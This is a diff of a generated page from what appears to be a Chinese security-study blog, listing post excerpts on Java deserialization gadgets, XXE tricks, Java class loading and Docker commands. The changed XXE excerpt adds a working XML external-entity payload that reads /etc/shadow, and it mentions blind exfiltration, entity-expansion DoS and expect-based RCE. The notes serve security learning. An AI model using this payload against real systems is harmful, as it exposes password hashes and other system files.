@@ -106,35 +106,15 @@
 执行类中的方法(RCE,SSRF等漏洞)
 反序列化入口
 
-分析（我认为）挖gadget需要先找到执行 ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="gadget"> gadget</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="Java安全"> Java安全</a></div><div class="read-more"><a class="more" href="/2021/11/30/urldns-lian-fen-xi/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2021/11/25/trick-xxe/">Trick总结——XXE</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2021-11-25T11:20:04.000Z">2021-11-25</time></div><div class="recent-post-content">有回显，读文件：
+分析（我认为）挖gadget需要先找到执行 ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="gadget"> gadget</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="Java安全"> Java安全</a></div><div class="read-more"><a class="more" href="/2021/11/30/urldns-lian-fen-xi/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2021/11/25/trick-xxe/">Trick总结——XXE</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2021-11-25T11:20:04.000Z">2021-11-25</time></div><div class="recent-post-content">有回显，读文件：&lt;?xml version="1.0" encoding="utf-8"?>
+&lt;!DOCTYPE foo [
+&lt;!ELEMENT foo ANY > 
+&lt;!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
+&lt;root>
+&lt;name>&amp;xxe;&lt;/name>
+&lt;/root>
 
-
-&xxe;
-
-
-无回显，外带：服务端
-
-
-有些时候读不出来，需要编码。
-
-
-
-exp
-
-DOS
-     
-     &lol9;
-
-RCEphp需要安装expect拓展。
- 
-
-
-&xxe;
-
-
-探测内网&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; 
-&lt;!DOCTYPE xxe [
-& ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="Trick"> Trick</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="XXE"> XXE</a></div><div class="read-more"><a class="more" href="/2021/11/25/trick-xxe/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2021/11/20/java-shen-ji-ji-chu-lei-jia-zai/">Java代码审计基础—类加载</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2021-11-20T11:20:04.000Z">2021-11-20</time></div><div class="recent-post-content">运行Java时，不会一次性的把class文件加载进内存，而是通过类加载机制进行动态加载，从而转换成java.lang.Class类的一个实例。
+无回显，外带：服 ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="Trick"> Trick</a><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="XXE"> XXE</a></div><div class="read-more"><a class="more" href="/2021/11/25/trick-xxe/#more">ReadMore</a></div><hr></div><div class="recent-post-item"><div class="post-title"><a href="/2021/11/20/java-shen-ji-ji-chu-lei-jia-zai/">Java代码审计基础—类加载</a></div><div class="post-time"><i class="fa fa-table"></i><time datetime="2021-11-20T11:20:04.000Z">2021-11-20</time></div><div class="recent-post-content">运行Java时，不会一次性的把class文件加载进内存，而是通过类加载机制进行动态加载，从而转换成java.lang.Class类的一个实例。
 JAVA四种修饰符的访问权限的，图出自鹏鹏哥哥的小红帽
 
 ClassLoader类Java提供了ClassLoader类实现类加载。
@@ -163,4 +143,4 @@ OFFICIAL: 是否是官方提供的
 AUTOMATED:  是不是自动化的
 
 拉取镜像docker pull xxx
-d ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="docker"> docker</a></div><div class="read-more"><a class="more" href="/2021/11/05/docker-ji-chu-ming-ling-xue-xi/#more">ReadMore</a></div><hr></div></section><nav class="cxo-page-nav"><a class="extend prev" rel="prev" href="/page/2/">&amp;It; PREV</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">NEXT &gt;</a></nav></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
+d ...</div><div class="recent-post-tags"><a class="post-tag fa fa-tag" href="javascript:void(0)" date-tags="docker"> docker</a></div><div class="read-more"><a class="more" href="/2021/11/05/docker-ji-chu-ming-ling-xue-xi/#more">ReadMore</a></div><hr></div></section><nav class="cxo-page-nav"><a class="extend prev" rel="prev" href="/page/2/">&amp;it; PREV</a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/">NEXT &gt;</a></nav></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a target="_blank" rel="noopener" href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
